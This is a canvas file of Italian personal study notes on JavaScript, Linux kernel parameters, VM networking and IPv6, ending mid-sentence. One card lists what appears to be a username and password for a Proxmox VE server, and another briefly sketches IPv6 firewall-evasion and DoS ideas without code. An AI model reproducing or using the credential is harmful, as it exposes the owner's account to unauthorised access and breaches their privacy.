		{"id":"24b1c4b94d6c7930","type":"text","text":"# `function` vs `let` & Arrow Functions\n\nIn realtà c'è una piccola differenza tra i due modi per creare funzioni.\n\nNel primo caso (i.e. con una dichiarazione) le funzioni vengono compilate prima di tutto il resto del codice, quindi posso scrivere prima la chiamata e poi la definizione.\n\nNel secondo (i.e. con un'espressione) le funzioni vengono compilate a runtime, quando vengono incontrate dal codice. Il gioco di prima non si può fare.\n\nC'è poi un terzo modo, più compatto, per scrivere una funzione:\n\n```javascript\nlet func = (arg1, arg2, ..., argN) => expression;\n```\n\ntipo\n```javascript\nlet sum = (a, b) => a + b;\nlet sayHi = () => alert(\"Hello!\");\n\nlet age = prompt(\"What is your age?\", 18);\nlet welcome = (age < 18) ?\n\t() => alert('Hello!') :\n\t() => alert(\"Greetings!\");\n```\nMa anche su più linee, tipo\n```javascript\nlet sum = (a, b) => { // the curly brace opens a multiline function\n\tlet result = a + b;\n\treturn result; // if we use {}, then we need an explicit \"return\"\n};\n```\nIn generale, quando dichiaro una funzione questa rimane visibile solo dentro il suo scope.","x":-11592,"y":6335,"width":759,"height":870,"color":"4"},
		{"id":"de0bef54fa0c368a","type":"text","text":"# SPACING","x":-13520,"y":7960,"width":250,"height":235,"color":"5"},
		{"id":"4c353e5b44b691db","type":"text","text":"# Debugging\n\nI debugger per i browser (`F10`) o per IDE (e.g. Visual Studio Code) ti fanno fare magie.\n\nOltre a questo, esistono dei tool (tipo [ESLint](https://eslint.org/)) che ti controllano lo stile del codice (i.e. indentare correttamente non è obbligatorio, quindi la gente potrebbe fare porcate) che come side-effect possono trovare bug. Si installa con (e.g. in `Node.js`) `npm install -g eslint` e si mette un file `.eslintrc` nella `root directory` del progetto, che conterrà una direttiva `extends` in cui posso specificare lo stile di scrittura. Pensa che roba.\n\nNon solo! Un problema tipico è il seguente:\n\n```\nFor instance, we’re creating a function f. Wrote some code, testing: f(1) works, but f(2) doesn’t work. We fix the code and now f(2) works. Looks complete? But we forgot to re-test f(1). That may lead to an error.\n```\n\nPer questo abbiamo una [soluzione](https://javascript.info/testing-mocha):\n\n```\nBehavior Driven Developement, BDD - Automated testing means that tests are written separately, in addition to the code. They run our functions in various ways and compare results with the expected.\n```\n\nPrima di scrivere il codice di una funzione possiamo farci un'idea di cosa fa e descriverla:\n\n```javascript\ndescribe(\"pow\", function() {\n\tit(\"raises to n-th power\", function() {\n\t\tassert.equal(pow(2, 3), 8);\n\t\tassert.equal(pow(3, 4), 81);\n\t});\n});\n```\n\n`describe` è il contenitore generale, ogni istanza `it` descrive un'azione della funzione e testa i risultati ottenuti a partire da specifici input con `assert`. Il problema di scrivere più `assert` nello stesso `it` è che un eventuale errore si fermerà alla prima sbagliata. A seconda dei test da fare, può essere utile scrivere più `it` (e.g. uno per i numeri negativi, uno per lo zero, ...). Altrimenti posso anche implementare cicli dentro la `describe`, oppure fare più `describe` innestate.\n\nTutte queste specifiche si ottengono dalle librerie `Mocha`, `Chai` e `Sinon`.","x":-12601,"y":8600,"width":759,"height":1072,"color":"4"},
		{"id":"8124f5c080607f2b","type":"text","text":"# Oggetti\n\n`JavaScript` è un linguaggio object-oriented. ","x":-12601,"y":9920,"width":759,"height":1105},
		{"id":"224c36cd83b414cf","type":"text","text":"# Credenziali\n\ndonato.1808606\ned5d8a4cc20ade2e4f6b\n\nRealm: Proxmox VE authentication server","x":-10180,"y":22237,"width":435,"height":403},
		{"id":"eb599150771640c2","type":"text","text":"# `sysctl`\n\nIl `kernel`, si fa, *fa cose*. Le decisioni prese da questo enorme ammasso di algoritmi dipendono da ***parametri*** che specificano cose tipo `quanto a lungo devo tenere in cache una pagina?` o `devo inoltrare i pacchetti IP da eth0 a eth1?`. Questi parametri possono essere specificati in tre modi:\n\n- All'avvio, tramite ***grub***. Sono specificati alla riga `GRUB_CMDLINE_LINUX_DEFAULT` in `/etc/default/grub`, ne sono esempi `quiet` (silenzia i messaggi del `kernel` all'avvio, i.e. quelli che vedi apparire a spam in alcune distro mentre carica il SO), `nomodeset` (disabilita il driver video del `kernel`), `init=/bin/bash` (invece di far partire il SO con il processo `init` fornisce all'utente una shell, tendenzialmente per recovery/debug). Per rendere effettive eventuali modifiche a questi parametri, `sudo update-grub && reboot`;\n- Al caricamento di un ***modulo del kernel***, i.e. un file `.ko` (`kernel object`). Si modificano con il comando `modprobe` o dal file `/etc/modprobe.d/modulename.conf`;\n- A ***runtime***, tramite strumenti come `sysctl` o comandi come `ip` (cfr. ***Comando `ip`***). In genere questi parametri gestiscono cose come lo `swap` (e.g. `vm.swappiness`) o il packet forwarding (e.g. `net.ipv4.ip_forward`).\n\nVi possono poi essere parametri specificabili in altri punti del sistema, ma limitiamoci al nostro protagonista. `sysctl` è un comando che consente modifiche direttamente da `Shell`. Posso ad esempio abilitare il routing `IPv6` dicendo\n\n```bash\nsysctl -w net.ipv6.ip_forward=1\n```\n\nMa questi parametri vivono anche come ***filesystem virtuale*** in `/proc/sys`, quindi fare\n\n```bash\necho 1 > /proc/sys/net/ipv6/ip_forward\n```\n\nprodurrà esattamente lo stesso risultato del comando sopra. Ovviamente, essendo il primo un comando ha una serie di controlli che ti impediscono di fare troppi danni (nonché di avere visione d'insieme, e.g. con l'opzione `-a` vedi tutti i parametri), mentre nel secondo caso hai totale libertà di modificare e fare disastri. \n\nEntrambi questi metodi hanno un unico problemino: non sono persistenti se faccio un `reboot`. Per ovviare a questa cosa devo modificare invece il file `/etc/sysctl.conf` (è in `/etc` che il `kernel` va a pescare le configurazioni di sistema permanenti, infatti tutto ciò che non si modifica a runtime nell'elenco sopra ha un `path` che inizia con `/etc`).\n\nOvviamente non serve scomodare tutta questa roba per settare i parametri del `kernel`. Una GUI (e.g. le configurazioni di rete in impostazioni) può tranquillamente ottenere lo stesso risultato con un semplice click.","x":-10580,"y":12588,"width":759,"height":1105,"color":"4"},
		{"id":"84fe8493ed579e54","type":"text","text":"# Shell vs TTY vs Terminale\n\nSe la `shell` è l'interprete di comandi, una ***TTY*** (`Teletypewriter`) è un'interfaccia che permette di parlare con essa (chiamata così perché nelle prime implementazioni era letteralmente una tastiera fisica).\n\nOgni `TTY` ha una propria `shell` (o diverse, e.g. usando `tmux` o `screen`) con i propri parametri. Quando avvii un SO `Linux` ce ne sono diverse, e puoi passare da una all'altra con `CTRL+ALT+FX`, dove `F1, F2` o `F7` tipicamente hanno sopra un ambiente grafico (e.g. ***Wayland*** o ***X11***), mentre le altre sono interfacce \"vecchio stile\" (dalle quali volendo posso far partire un ambiente grafico, e.g. con `startx`). Segue che su diverse `TTY` posso avere diverse sessioni grafiche con diversi utenti loggati in parallelo.\n\nUn ***terminale*** è una qualsiasi applicazione che si collega ad una `TTY` e permette di interagire con esso. Puoi farci tutto ciò che fai su una `TTY`, più altra roba come scrolling, palette cromatica, font personalizzati e simili.","x":-2225,"y":-30,"width":759,"height":686,"color":"4"},
		{"id":"c458828e446d076f","type":"text","text":"# Modalità Bridged\n\nOgni `VM` si connette alla rete dell'`host` tramite la ***modalità bridged***, i.e. \"estendendo\" il cavo `ethernet` dell'`host` e collegandosi alla stessa interfaccia. In questo caso, il `router` vedrà la `VM` come un secondo `host` connesso sulla stessa interfaccia, e gli assegnerà un `IP` unico sulla sua `LAN`.\n\nTutto questo potrebbe rompersi se l'`host` è connesso in `WiFi`. Per come funziona, `WiFi` ha bisogno di un `MAC` univoco per ogni connessione, e se crei un'interfaccia virtuale di tipo `bridge` (e.g. `br0`) la scheda `WiFi` (interfaccia `wlan0`) potrebbe letteralmente rifiutarsi e scartare i pacchetti diretti a questo secondo `MAC` fittizio che non è il suo. Inoltre, potrebbe essere il `router` stesso a non accettare una situazione di tipo \"stesso client, diversi `MAC`\".\n\nCi sono diverse soluzioni a questa cosa, tra cui `NAPT` (i.e. traduzione degli indirizzi a livello di rete) e l'uso di un'interfaccia `TAP` (`Terminal Access Point`, che in pratica simula un cavo `ethernet` virtuale tra `VM` e `host`, contrapposto ad una rete `TUN`). In pratica, se l'`host` è connesso in `WiFi` e vuole far funzionare un bridge si deve comportare da `router`.\n\nOra, Linux ha un suo sistema di Bridges (`Linux Bridges`) integrato nel kernel. Per creare la propria rete tra `container`, Katharà può scegliere di appoggiarsi su questo sistema.\n\nL'alternativa è un sistema più complesso, basato su un SW che gira in `user mode` detto `VDE` (`Virtual Distributed Ethernet`). Questo metodo richiede configurazione aggiuntiva, perché simula il comportamento di uno switch (quindi dovrei definire CAM Tables, VLAN, e altre cose simpatiche).\n\nVisto che non ci va di configurare cose in più, usiamo `katharamp` invece di `katharamp_vde` in `Docker Network Plugin Version` (`kathara settings`).","x":-10579,"y":7440,"width":759,"height":924,"color":"4"},
		{"id":"700cc9b921c62b5c","x":-8061,"y":16480,"width":759,"height":1081,"type":"text","text":"GUI automatic = SLAAC\n\n\n\n\n\n\nBerkeley Packet Filter (BPF) syntax (man pcap-filter)\nprotocol direction type\n33\n–Protocol: ether, tcp, udp, ip, ip6, arp\n–Direction: src, dst\n–Type: host, port, net, portrange\n–Other primitives: less, greater, gateway, broadcast\n–Combinations with operators: and (&&), or (||), not (!)\n\n# assign global unicast\n\n- manuale - chiaro\n- dynamic - su IPv4 si fa con DHCP. Qua si può fare in due modi:\n\t- stateful i.e. conosco la distribuzione degli indirizzi (DHCPv6). Quindi c'è un server che sa.\n\t\t- c'è prefix delegation per farsi assegnare un'intera rete invece di un unico coso globale\n\t- stateless, i.e. non li conosco e non mi interessano (SLAAC)\n\t- esiste metodo ibrido SLAAC + DHCPv6, dice che si usa con DNS locale per cose entro la rete (?)\n\n\n1. SLAAC (vedi SLAAC, slide 63 i rossi sono uguali perché generati allo stesso modo)\n\t1. e che succede se scegliamo lo stesso IPv6? duplicate address detection: se nessuno risponde alla mia neighbor solicitation con l'IP che voglio scegliere, allora lo scelgo\n2. router as DHCP server - identico ma cambiano delle flag (vedi rec, sta correndo un po') - you take the ip you want but look for DNS (?)\n3. solo DHCP (come IPv4).\n\n# Prefix Delegation\n\nstessa cosa di prima, ma chiedo N indirizzi. fatto in genere dai router che sanno di avere degli hosts dietro (anche io posso essere il router della mia casa domotica, per esempio). Faccio prefix delegation request.\n\nRA = Router Advertisement\n\nva le veci di IANA tipo\n\ndi base ti dicono \"tiè, fai tu\""},
		{"id":"09b849ff0d1ee8ad","type":"text","text":"# 21.3\n\nogni multicast parte con 8 uni (FF). \n\nflag - si usa quasi solo lo 0 (permanent assigned by IANA)\n\nall devices: router advertisement\n- ma quindi è un broadcast? ... non proprio, perché non è su IPv6 ma sul MAC (?)\nall routers: discovery\necc\n\nserver DHCP può essere non nella stessa rete. il router fa da tramite.\n\nIPv6 toglie checksum perché c'è già a livello 2 (ethernet) e livello 4 (TCP, UDP)\n\n(Encryption a livello 2 è ottima, perché non si vede manco la destinazione di IP)-> non so cosa c'entra, mi sa che sta parlando di eduroam con quelli a distanza\n\nIPv4 ha header di dimensione variabile a causa delle options. Con IPv6 è sempre 40 bytes.\n- evito di distinguere header size (IHL, espresso in numero di word da 32bit, in genere 5 se non ci sono opzioni) e payload size (total len)\n\t- questo perché 99% dei pacchetti non usava opzioni. se serve, complichiamo, dice ipv6.\n- inizio subito a leggere\n\nnota che anche in v6 ci sono le options. \n\ntraffic class è il tipo di servizio da offrire (e.g. real time, ecc)\n\nflow label è una novità. non lo usa quasi nessuno. si può usare per raggruppare diversi pacchetti. IPv4 è stateless, questo può rendere IPv6 un po' stateful (i.e. se diversi pacchetti fanno parte dello stesso flow). diverse connessioni TCP dovrebbero avere diversi flow label. \n\nnext header è il modo di interpretare i prossimi 40bytes. di norma è (zero?) se ci sono dati, altrimenti c'è un extension header (per le opzioni?). Si possono fare in catena (chain of...). questa roba si legge solo end-to-end (a parte specifiche routing e hop-to-hop). in pratica solo gli edge processano le options, tutti gli altri router intermedi leggono una roba fissa e forwardano velocissimi.\n\n- routing permette di speciicare il path per la destinazione\n- ESP (encryption, usato per le VPN), AH (authentication, nessuno può modificare senza che il destinatario lo sappia, hash firmato con (la chiave del sender NO! PEERCHé NO???) con un message authentication code) serve per IPSec (implementarlo qui te lo applica su tutti i layer superiori).\n\t- spe forse MAC è hash crittato con chiave simmetrica\n- l'ordine delle options è importante (vedi slides). perché due volte destination? la seconda è crittata.","x":-15078,"y":6397,"width":759,"height":1146},
		{"id":"4f07507dea4ac4e5","type":"text","text":"cerca materiale di network infrastructures su moodle","x":-14049,"y":17601,"width":281,"height":133},
		{"id":"acbfb7d40b4eec22","type":"text","text":"# Sicurezza\n\nhuge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)\n\n(Encryption a livello 2 è ottima, perché non si vede manco la destinazione di IP)-> non so cosa c'entra, mi sa che sta parlando di eduroam con quelli a distanza","x":-10580,"y":15788,"width":759,"height":557},
		{"id":"24f129c1304ba762","type":"text","text":"# 28.3\n\ncovert channel!\n\nscambiando l'ordine degli extension header puoi fregare il firewall (a quanto pare dovrebbero essere droppati ma in pratica nessuno lo fa)\n\nproblema con gli overlapping fragments (perché succede?? di base ti consigliano di buttare tutto se vedi overlap ma pare nessuno lo faccia) - weakness of complexity (indaga) (poi ne parla di nuovo più avanti) (rec!! bello che puoi bloccare tutto waiting for last fragment. simile a SYN attack o request http senza completare richiesta, mirano tutti a DoS)\n\ndovresti anche buttare i frammenti non frammenti (risultano esserlo, ma ce n'è solo uno)\n\nsoluzione al ping pong di router specification: deprecated (reject it!)\n\nswitch si aspetta advertisement del router solo su una certa porta. non ho capito bene, un attacker può fare roba brutta usando la stack di header (rec). in pratica devi analizzare tutti gli header per essere sicuro.\n\nignora IPsec\n\nfd00 è UniqueLocalAddress\n\n`traceroute` è per determinare il network prefix??\n\nOUI: vendor, FFFE fixed, quindi poca roba da guessare\n\nsalta slide prima di security tips.\n\n#### 3.1 andiamo in application layer (?)\n\nICMPv6 per i giochi con advertisement/solicitation (potentissimi mi sa, specie bogus)\n\ntutto questo si filtra con gli switch (l'idea è che conosce su che porta sta il router, e se arriva una RA da un'altra quello CAAAPISCE che non dovrebbe e la blocca, e simili)","x":-10595,"y":16529,"width":774,"height":843},
		{"id":"9338dce122e9b7bf","type":"text","text":"# Indirizzi IPv6 (Reti)\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.","x":-10580,"y":14844,"width":790,"height":589,"color":"4"},
		{"id":"d3263c1925ddb36c","type":"text","text":"# IPv6\n\nLe prime tre versioni di IP non sono state neanche rilasciate ufficialmente, la quarta ha finito gli indirizzi assegnabili e la quinta è stata un mezzo fallimento. La sesta è uscita bene.\n\nUn indirizzo `IPv6` è un identificativo a `128 bit` ($\\sim 3.4\\cdot 10^{38}$ indirizzi) raggruppati in `8` gruppi da `16 bit` spesso rappresentati con notazione esadecimale (`16 bit`$\\to$ `4 hex`):\n```\n2001:0DB8:AAAA:1110:1000:0000:0000:0100\n```\n\nQuesto permette di implementare Internet per come era stato pensato all'inizio: connessioni dirette tra coppie di indirizzi (i.e. senza usare il NAT).\n\n\nOgni indirizzo `IPv6` è *de facto* gerarchicamente diviso secondo la \"***3-1-4 rule***\":\n\n- I primi `3` gruppi di `HEX` (***prefix***) individuano la ***rete*** (i.e. $2^{48}$ possibili reti);\n- Il successivo individua la ***sottorete*** (i.e. $2^{16}$ possibili sottoreti per ogni rete);\n- Gli ultimi `4` (***interface ID***) individuano l'***host*** (i.e. $2^{64}$ possibili host per ogni sottorete).\n\nNota che questa divisione è fissa, i.e. non esistono subnet mask di lunghezza variabile. I gruppi sono separati da `:`, e ci sono due regole per scrivere meno roba possibile:\n\n- Ometti gli zeri iniziali nei gruppi (i.e. al posto di `0100` puoi scrivere `100`);\n- Comprimi la più lunga sequenza di zeri con doppio `:` (i.e. `1000:0000:0000:0100` diventa `1000::100`, non posso eliminare i tre zeri di `1000` perché sono significativi!).\n\t- Se ci sono due sequenze uguali si comprime solo la prima.\n\nSegue che\n\n```\n2001:0DB8:AAAA:1110:1000:0000:0000:0100 -> 2001:0DB8:AAAA:1110:1000::100\n```\n\nDiversi prefissi (i.e. i primi `3 bit`) di un indirizzo `IPv6` definiscono diverse ***classi di indirizzi***, i.e. diversi usi a cui sono adibiti (come voleva fare inizialmente `IPv4`).","x":-12601,"y":14724,"width":759,"height":829,"color":"6"},
		{"id":"9a31e35de575334d","type":"text","text":"# Indirizzi Link Local\n\nSe il singolo link fisico (e.g. un cavo ethernet) fosse una sottorete, un indirizzo `IPv6` di tipo `Link Local` farebbe le veci di un indirizzo `MAC`. È quindi obbligatorio averne almeno uno per ogni interfaccia `IPv6`, altrimenti l'`host` non sarà in alcun modo raggiungibile. Non compaiono nelle tabelle di routing, i.e. non possono essere instradati su Internet.\n\nPosto che iniziano quasi sempre per `FE80::/64` (ma arrivano fino a `FEBF`, ricordando che fisso solo i primi `3 bit`), posso generarne uno\n\n- in modo manuale (tipicamente scelto per i router, e.g. `FE80::2`);\n- randomizzando gli ultimi `64 bit` (è improbabile sceglierne due uguali sullo stesso link);\n\t- Eh ok ma se succede? Esiste il protocollo di ***Duplicate Address Detection*** (***DAD***) che, prima di usarlo, si assicura che il `Link Local` generato sia unico;\n\t- Usato da Windows e Linux.\n- sfruttando il `MAC` univoco di partenza (***EUI-64***, `Extended Unique Identifier`): prendo i `48 bit` originali (flippando il settimo `bit`, \"don't ask why\") e ci aggiungo in mezzo i `16 bit FFFE`. Questa sequenza costituisce quindi la \"firma\" di `EUI-64`.\n\t- Nota che questo rende la parte host statica, indipendentemente da dove mi trovo o quando mi connetto, il che può essere un problema se sono un fissato di privacy;\n\t- Usato da MacOS.","x":-13610,"y":13932,"width":759,"height":557,"color":"4"},
		{"id":"1d0acbc9119f8702","type":"text","text":"# Assegnazione degli Indirizzi `IPv6`\n\nAbbiamo capito che\n\n- Un ***Link Local*** deve essere ***unico sul collegamento fisico***;\n- Un ***Unique Local*** deve essere ***unico sulla subnet***;\n- Un ***Global Unicast*** deve essere ***unico su Internet***.\n\nCome faccio ad assegnare indirizzi unici?\n\n1. Genero un indirizzo ***Link Local*** univoco sul collegamento fisico (e.g. `FE80::CAFE`);\n2. Ora sono raggiungibile sul link fisico, quindi sono in grado di comunicare con il ***router***. Questa conversazione può partire in due modi diversi:\n\t- ***Router Advertisement*** (***RA***) - Il router si pubblicizza con messaggi periodici sul link tramite un messaggio ***ICMPv6*** `Type 134`. Il destinatario è l'indirizzo ***multicast*** `FF02::1`, i.e. `All Hosts` (non è un broadcast perché gli altri router sono esclusi);\n\t- ***Router Solicitation*** (***RS***) - Se non ho voglia di aspettare il prossimo RA, posso far partire io la conversazione con un messaggio `ICMPv6 Type 133` inviato a `FF02::2` (i.e. tutti e soli i router). La risposta sarà un messaggio di RA ***unicast*** diretto a me;\n3. Ricevere il messaggio del router significa scoprire il ***prefisso di rete*** della mia LAN (nonché l'indirizzo del ***default gateway*** e altri parametri di connessione). A partire da questo posso generare un ***Global Unicast***, in tre modi:\n\t- ***Stateful DHCPv6*** - Il messaggio di RA mi fornisce l'`IP` di un server `DHCPv6` (non per forza sulla stessa LAN: in questo caso, è il router stesso ad offrirsi di fare da tramite), mi affido a lui per tutto (esattamente come in `DHCPv4`);\n\t- ***StateLess Address Auto Configuration*** (***SLAAC***) - Visto che ho generato i `64 bit` di host in modo univoco per l'indirizzo Link Local, posso provare ad aggiungere a questi stessi `bit` il prefisso di rete e sperare (i.e. controllando con DAD) che questo sia unico entro la LAN (se lo è entro la LAN lo è anche in tutto Internet);\n\t- ***Stateless DHCPv6*** - Un mix tra `SLAAC` e un `DHCPv6` stateful, usa il primo per `IP` e `default gateway` ed il secondo per il resto dei parametri (e.g. server `DNS`).\n","x":-15628,"y":14724,"width":759,"height":829,"color":"4"},
		{"id":"920967296878cb3a","type":"text","text":"# Divisione degli Indirizzi `IPv6`\n\nCome in `IPv4`, anche qui diversi prefissi sono adibiti a diverse cose, ma stavolta sul serio. La IANA ha diviso la torta degli indirizzi in otto gruppi uguali (`bit` iniziali `000`, `001`, `010`, `011`, ...). `5` di queste fette sono totalmente inutilizzate, le restanti sono:\n\n- Tutto ciò che inizia con i bit `001` (i.e. il primo `hex` del primo gruppo è `2` o `3`, quindi sono tutti gli indirizzi da `2000::/64` a `3fff:ffff:ffff:ffff::/64`) è un ***Global Unicast Address*** e costituiscono quindi un ottavo di tutti i possibili indirizzi;\n- La fetta di torta degli `IPv6` che iniziano con `000` è così divisa:\n\t- `::/128` è ***unspecified*** (i.e. `non ho un IP, sono in fase di configurazione`);\n\t- `::1` è l'indirizzo di ***loopback***. Solo uno? Sì, non aveva alcun senso avere un'intera rete da $2^{24}$ indirizzi dedicata a questo (quando hanno fatto `IPv4` non avevano idea della direzione in cui si sarebbero sviluppate queste cose, quindi nel dubbio ne hanno riservati un botto. Ad oggi sappiamo che ne basta quasi sempre uno solo);\n- La fetta `111` è così divisa:\n\t- `FC00::/7` (i.e. iniziano con `1111 110`) sono ***Unique Local Addresses***, i.e. gli ***indirizzi privati di `IPv4`***. In teoria si dividono a loro volta in due gruppi:\n\t\t- `FC00/8`, se vengono allocati da un server centrale (mai implementato);\n\t\t- `FD00/8`, se vengono assegnati in qualsiasi altro modo (è quello che si usa).\n\t- `FE80::/10` (i.e. iniziano con `1111 1110 10`, quindi vanno da `fe80:roba` fino a `febf:roba`) sono ***Link-Local Addresses*** (in pratica sono indirizzi ***MAC***);\n\t\t- Nota che gli indirizzi da `fe00:roba` a `fe7A:roba` non sono assegnati, quindi tendenzialmente riconosci un Link-Local perché inizia per `fe`.\n\t- `FF00::/8` (i.e. partono sempre con `FF`) sono indirizzi di ***Multicast***, che includono gli indirizzi di tipo ***Solicited Node*** (`FF02::1:FF00:0000/104`) \"utili\" (...) ad implementare il protocollo di ***Neighbor Discovery***;\n\t\t- Qui c'è *quasi* un indirizzo di broadcast, i.e. `FF02::1` (`to all IPv6 devices`).\n\t- Un `111` iniziale significa che la prima lettera può essere sia una `E` che una `F`. Gli indirizzi che partono con `E` non sono stati assegnati, così come quelli che vanno da `F0` iniziale a `FC00` escluso: di questa fetta sono assegnati solo alcuni spicchi.","x":-14619,"y":14724,"width":759,"height":829,"color":"4"},
		{"id":"faa7a7d081f0062d","type":"text","text":"# DHCPv6 & Prefix Delegation\n\nserver DHCP può essere non nella stessa rete. il router fa da tramite.\n\nIn realtà quando uso DHCP potrei dover mandare un multicast a tutti i server, perché potrei non sapere l'`IP`.","x":-15628,"y":15788,"width":759,"height":557},
		{"id":"a3f0b1fb4d585e4d","type":"text","text":"# Global Unicast Address (GUA)\n\nI ***GUA*** Corrispondono agli ***indirizzi pubblici di `IPv4`***, e implementano la loro idea iniziale: ogni oggetto su Internet è univocamente determinato da un indirizzo `IP`.\n\nIl sottogruppo `2001:DB8::/32` è dedicato alla \"***documentazione***\", i.e. ad usi tecnici e accademici. Questi indirizzi non vengono instradati su Internet_v6;\n\nIl sottogruppo `2002::/16` (***6to4***) era in origine dedicato alla retrocompatibilità con `IPv4`. Vale a dire, prendo un `IPv4` (e.g. `192.88.99.1`) e lo scrivo in esadecimale (e.g. `C058:6301`). L'`IPv6` associato a questo `IPv4` è `2001:C058:6301::/48`.\n\n`::FFFF:0:0/96` è simile a `6to4`, ad oggi non si usa quasi più.\n","x":-14619,"y":15788,"width":759,"height":557},
		{"id":"9044be12381dd874","type":"text","text":"# Indirizzi Solicited Node\n\nRieccoci ad un nuovo episodio di \"Cose Poco Chiare\". La faccio breve.\n\nAbbiamo detto che `ARP` ci fa schifo perché usa il `broadcast`, quindi tocca usare il multicast. Ma siamo su `Ethernet`. Com'è fatto un multicast `Ethernet`? Di norma avrebbe prefisso `01:00:5E`, ma con `IPv6` diventa `33:33`. Niente di profondo, serve solo a dire che questi ultimi sono il risultato di una mappatura da un multicast `IPv6` ad un multicast `Ethernet`.\n\nMa come posso mai mappare in modo univoco un indirizzo a `128 bit` in uno a `56 bit`? Esatto: non posso. Ed è proprio per questo che definiamo una sottoclasse di indirizzi `IPv6` multicast detti ***Solicited Node***, aventi prefisso `FF02::1:FF00:0000/104`. Questo riduce il numero di indirizzi da mappare, dovendo scegliere solo gli ultimi `24 bit`.\n\n\"Ma scusa, il prefisso `33:33` ti dà `16 bit`, se gli aggiungi i `24 bit` che caratterizzano il Solicited Node arrivi solo a `40`. E gli altri `16`?\". Eh già, perché siccome siamo svegli ci tocca aggiungere anche quell'`FF` del penultimo gruppo. Ma non è finita!\n\nQuei `24 bit` sono proprio gli ultimi `24 bit` del GUA scelto dal nodo, in modo che l'indirizzo `MAC` multicast su cui ascoltare sia facilmente calcolabile. Già, infatti: che motivo c'è di passare per questo \"Solicited Node Address\" intermedio?\n\nRisposta breve: nessuno, se non per comodità di cosa scrivere nel `layer 3` della `NS`.\n\nVabbè passiamo avanti che questa roba è relativamente inutile, sono io che perdo tempo.","x":-14619,"y":13079,"width":759,"height":557,"color":"4"},
		{"id":"62c18499ff705672","x":-14619,"y":13932,"width":759,"height":557,"color":"3","type":"text","text":"# Indirizzi Multicast\n\nGli indirizzi ***multicast*** iniziano con `1111 1111`. Seguono `4 bit` di `flag` e `4` di `scope`, che servono a roba tecnica che mi interessa poco. Segue il `group ID`, che serve a capire a chi mandare il messaggio. Tipo, a parità di `flag` e `scope` (e.g. `0` e `2`) posso avere diversi target distinti dal `group ID` (e.g. `All RIP routers`, `All hosts`, `All DHCP servers`, ...).\n\nNota che saremmo tentati di dire che alcuni di questi indirizzi sono `broadcast`. Non è così, perché come vedremo nel riquadro sopra viene tutto mappato sul `multicast ethernet`. <span style=\"color:rgb(236, 155, 14)\">Onestamente non ho capito a che serve insistere su questa cosa...</span>\n"},
		{"id":"829e7a360cd16a1f","type":"text","text":"# Neighbor Discovery Protocol (NDP)\n\nIl protocollo `IPv6` ha a questo punto bisogno di due cose:\n\n- Sostituire il protocollo `ARP` per trovare l'indirizzo `MAC` dato l'indirizzo `IPv6`. I Link Local sono infatti indirizzi logici, mi serve ancora un indirizzo fisico per far funzionare il DLL, e non ci piace un protocollo a livello `IP` che si poggia su `Ethernet`;\n- Assicurarsi che i Link Local e i GUA assegnati con SLAAC siano unici.\n\nOltre ai già menzionati `RA` e `RS`, `ICMPv6` aggiunge altri tre tipi messaggi per implementare i protocolli complessivamente detti di ***Neighbor Discovery***.\n\n- ***Neighbor Solicitation*** (***NS***, `Type XXX`) - per implementare diversi protocolli:\n\t- Scegliendo come destinatario un ***Solicited Node Address***, tramite una NS posso richiedere il `MAC` di un host in LAN di cui conosco solo il GUA (i.e. sostituisce `ARP`): nonostante l'esistenza del Link Local, il DLL di `TCP/IP` usa ancora il `MAC`;\n\t- ***Duplicate Address Detection*** (***DAD***) - Prima di utilizzare un Link Local o un GUA mando un NS a tale indirizzo e vedo se qualcuno risponde con un NA.\n- ***Neighbor Advertisement*** (***NA***) - Tendenzialmente viene inviato in risposta ad un NS, posso scegliere di mandarlo per primo (***unsolicited***) per annunciare il mio `MAC`;\n- ***Redirect*** - Come in `ICMPv4`, se c'è una rotta migliore il router avvisa l'host.","x":-15628,"y":13932,"width":759,"height":557,"color":"4"},
		{"id":"0654efafad655f4a","type":"text","text":"# Tipologie di parametri\n\nDentro `/proc/sys` troviamo una gerarchia concettuale per la semantica dei parametri, che si sviluppa lungo le sottocartelle:\n\n- `net/` - La più usata, definisce i [parametri](https://docs.kernel.org/networking/ip-sysctl.html) di ***rete***. Ha quindi sottocartelle come `ipv4/`, `ipv6/`, `netfilter/` (i.e. `Firewall/NAT` basato su `iptables`) o `core/` (i.e. opzioni trasversali ai protocolli, e.g. quante connessioni `TCP` accetto);\n- `vm/` - Letteralmente `Virtual Memory`, gestisce allocazione e swap per la RAM;\n\t- Se finisco sia RAM che swap il sistema va in ***OOM*** (***Out of Memory***), che di norma viene gestito con un processo ***OOM Killer*** (chiama delle `kill` sui processi che consumano molta memoria). Si vede dai log di sistema, tipo `invoked oom-killer`.\n- `fs/` - `filesystem`, regola cose tipo massimo numero di file apribili in contemporanea, massimo numero di directory monitorabili da un processo `inotify`, log e simili;\n- `kernel/` - Autoesplicativo, i parametri vanno dal nome `host` del sistema a quanti secondi aspettare prima di riavviare il sistema dopo un `kernel panic`;\n\t- Quando il `kernel` incontra un errore non recuperabile e talmente grave che non può continuare in sicurezza, va letteralmente nel panico. Un ***kernel panic*** è un crash totale del sistema (e.g. BSOD su Windows) che in pratica ti sta dicendo `prima di fare danni peggiori, io fermo tutto`.\n- `dev/` - Qui ci sono eventualmente i parametri dei `device` HW esterni, e.g. per i 